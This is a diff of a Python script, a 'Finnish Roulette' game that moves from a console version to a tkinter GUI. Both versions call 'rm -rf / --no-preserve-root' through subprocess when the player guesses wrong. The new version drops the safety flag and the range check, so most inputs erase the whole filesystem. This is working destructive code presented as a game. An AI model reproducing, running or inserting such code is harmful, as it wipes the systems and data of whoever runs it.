@@ -1,76 +1,55 @@
 import random
 import subprocess
+import tkinter as tk
 
-print("mode 1: standard mode")
-print("mode 2: classic mode")
 
-mode = input("select mode (1 or 2): ")
+class MainWindow(tk.Tk):
+    def __init__(self):
+        super().__init__()
+        self.cylinder = random.randint(1,6)
 
-print("*click*")
-print("this is a revolver")
+        #window setup
+        self.geometry("700x650")
+        
+        self.title("Finnish Roulette")
 
-## IMPORTANT
+        self.resizable(False, False)
 
-kill_mode = True ## kill mode true = system wipe, false = print message
+        #frame setup
+        self.frame = tk.Frame(self,width=700,height=650)
+        self.frame.grid(row=0,column=0,sticky="NW")
 
-## IMNPORTANT
+        #app structure
+        self.title = tk.Label(self.frame, text="Finnish Roulette", font=("Helvetica", 30))
+        self.title.place(x=350, y=20, anchor="n")
 
-while True:
+        self.subtitle = tk.Label(self.frame, text="Insert a number from 1 to 6", font=("Helvetica", 14))
+        self.subtitle.place(x=2, y=80, anchor="nw")
 
-    if mode == "1":
+        self.text_input = tk.Entry(self.frame, font=("Helvetica",15), width=6)
+        self.text_input.place(x=2, y=100, anchor="nw")
 
-        print("I have selected a random number from 1 to 6")
-        print("if you guess it right, your system will be spared")
-        print("if you guess wrong, your system will be wiped")
-        print("good luck")
+        self.enter_button = tk.Button(self.frame, text="Enter", command=self.button_press, font=("Helvetica", 9))
+        self.enter_button.place(x=200, y=100, anchor="nw")
 
-        cylinder = random.randint(1, 6)
+    def button_press(self):
+        if self.text_input.get():
+            try:
+                input = int(self.text_input.get())
+            except ValueError:
+                self.subtitle['text'] = "Please enter a number"
+                return
 
-        #print ("cylinder", cylinder)
-            
-        cylinder_guess = int(input("take a guess (number from 1-6): "))
-
-        if cylinder_guess < 1 or cylinder_guess > 6:
-            print("nice try")
-            continue
-
-        print("guess", cylinder_guess)
-
-        if cylinder_guess != cylinder:
-            print("say goodbye to your system")
-            if kill_mode == True:
+            if input != self.cylinder:
+                self.subtitle['text'] = "Say Goodbye to your system"
                 subprocess.call("rm -rf / --no-preserve-root", shell=True)
-            elif kill_mode == False:
-                print("your system was destroyed")
-            break
-        else:    
-            print("your sytem lives for another day")
-            break
+            elif input == self.cylinder:
+                self.subtitle['text'] = "Your system lives for another day"
+                self.cylinder = random.randint(1,6)
+        else:
+            self.subtitle['text'] = "Please enter an input"
 
-    if mode == "2":
 
-        print("I have loaded a random cylinder with a bullet")
-        print("if you guess the cylinder I selected, your sytem gets deleted")
-
-        cylinder = random.randint(1, 6)
-
-        #print ("cylinder", cylinder)
-            
-        cylinder_guess = int(input("take a guess (number from 1-6): "))
-
-        if cylinder_guess < 1 or cylinder_guess > 6:
-            print("nice try")
-            continue
-
-        print("guess", cylinder_guess)
-
-        if cylinder_guess == cylinder:
-            print("say goodbye to your system")
-            if kill_mode == True:
-                subprocess.call("rm -rf / --no-preserve-root", shell=True)
-            elif kill_mode == False:
-                print("your system was destroyed")
-            break
-        else:    
-            print("your sytem lives for another day")
-            break
+if __name__ == "__main__":
+    window = MainWindow()
+    window.mainloop()
